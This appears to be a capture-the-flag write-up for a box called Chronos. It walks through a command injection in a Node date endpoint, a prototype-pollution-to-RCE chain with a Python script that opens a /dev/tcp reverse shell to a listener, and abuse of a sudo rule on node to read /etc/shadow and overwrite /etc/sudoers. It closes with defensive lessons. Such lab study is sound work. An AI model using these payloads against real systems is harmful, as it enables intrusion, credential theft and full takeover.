# Chronos — CTF Writeup

**Difficulty:** Medium
**Category:** Command Injection (date-format endpoint), Node.js Prototype Pollution → RCE, Sudo Misconfiguration (NOPASSWD node)

## Overview

Chronos runs two Node/Express applications side by side: a public date-formatting service on port 80/8000 and an internal "v2" backend reachable only from localhost. The public app's `/date` endpoint turned out to pass user input straight into a format string, giving remote code execution as `www-data`. From there, the internal v2 app was vulnerable to a classic Node.js template-engine prototype-pollution chain (`__proto__.outputFunctionName`), escalating to a second, more privileged user (`imera`). The final step abused a `sudo` rule allowing `node` to run as root with `NOPASSWD` — using Node's own `fs` module to rewrite `/etc/sudoers` and grant full root.

## Enumeration

Three ports were open:

- **22** — SSH
- **80** — HTTP (the public date-formatting app)
- **8000** — Express (same app family, confirmed via headers/behavior)

Reviewing the app's front-end JavaScript (after decoding/deobfuscating it) showed that the `/date` endpoint on port 80 accepted a `format` query parameter and passed it through to a date-formatting routine without sanitization.

## Foothold #1 — Format-String Command Injection on `/date`

With the `format` parameter identified as attacker-controlled, a reverse-shell command was crafted, base58-encoded (to survive the format-string parsing/URL handling), and sent as the `format` value:

```
GET /date?format=<base58-encoded reverse shell payload>
```

Catching the callback on a listener produced a shell as `www-data`:

```bash
nc -lvp 4444
```

```
www-data@chronos:/opt/chronos$
```

The shell was stabilized the usual way:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z, then on the attacker side:
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

## Foothold #2 — Prototype Pollution in the Internal `chronos-v2` App

Enumerating from the `www-data` shell revealed a second application, `/opt/chronos-v2`, listening only on localhost (port 8080). It used a template engine vulnerable to the well-known **`__proto__.outputFunctionName` prototype-pollution-to-RCE** technique: polluting `Object.prototype.outputFunctionName` with a payload that breaks out of the generated function body lets arbitrary JavaScript — and therefore arbitrary shell commands via `child_process` — run on the next render.

```python
import requests

cmd = 'bash -c "bash -i >& /dev/tcp/192.168.1.112/4444 0>&1"'

# pollute the prototype
requests.post('http://127.0.0.1:8080', files={
    '__proto__.outputFunctionName': (
        None,
        f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x"
    )
})

# trigger the render to execute the injected command
requests.get('http://127.0.0.1:8080')
```

Running this from the `www-data` foothold (targeting the app on its internal `127.0.0.1:8080` listener) caught a second shell, this time as the application's own user:

```
imera@chronos:/opt/chronos-v2/backend$
```

The user flag (`user.txt`) was stored base64-encoded and decoded after retrieval.

## Privilege Escalation — Sudo NOPASSWD on `node`

`sudo -l` as `imera` showed a rule allowing `node` to be run as root with `NOPASSWD`. Since Node's REPL/`-e` flag gives full scripting access (filesystem, child processes, everything), this is equivalent to unrestricted root — comparable to any other GTFOBins-style interpreter misconfiguration.

The shadow file was read first to confirm the scope of access:

```bash
sudo node -e 'process.stdout.write(require("fs").readFileSync("/etc/shadow"))'
```

Then the sudoers file itself was overwritten using the same primitive, granting `imera` full, passwordless sudo:

```bash
sudo node -e 'require("fs").writeFileSync("/etc/sudoers", "imera ALL=(ALL) NOPASSWD: ALL")'
```

With that in place, escalating to root was immediate:

```bash
sudo su
```

```
root@chronos:~# cat root.txt
YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK
```

(the root flag, also base64-encoded).

## Summary of Techniques

| Stage | Technique |
|---|---|
| Recon | Deobfuscating front-end JS to find the unsanitized `format` parameter on `/date` |
| Foothold #1 | Format-string command injection → reverse shell as `www-data` |
| Internal pivot | Discovery of a second, localhost-only app (`chronos-v2`, port 8080) |
| Foothold #2 | Node.js template-engine prototype pollution (`__proto__.outputFunctionName`) → RCE as `imera` |
| Privilege escalation | `sudo` NOPASSWD on `node` → used `fs.writeFileSync` to overwrite `/etc/sudoers` → full root |

## Lessons Learned

- Any endpoint that accepts a user-controlled "format" or "template" string and feeds it to a formatting/templating engine is a strong RCE candidate — treat format strings as code, not data.
- `__proto__`/prototype-pollution bugs in Node template engines are a recurring, high-impact bug class; sanitize or freeze `Object.prototype` and validate multipart field names, not just values.
- Never grant `sudo` NOPASSWD on a general-purpose interpreter (`node`, `python`, `perl`, etc.) — it's functionally equivalent to unrestricted root, since the interpreter can read/write any file or spawn any process the way this box demonstrated.
- Internal, localhost-only services aren't a security boundary once there's any RCE on the host — they just become the next pivot target.
